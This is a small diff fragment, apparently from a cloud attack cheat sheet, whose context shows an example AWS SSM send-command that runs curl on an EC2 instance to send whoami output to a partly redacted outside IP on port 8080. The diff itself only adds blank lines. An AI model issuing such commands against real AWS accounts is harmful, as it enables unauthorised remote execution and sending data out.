@@ -19,3 +19,5 @@ $ aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --qu
 e.g:
 $ aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
 ```
+
+
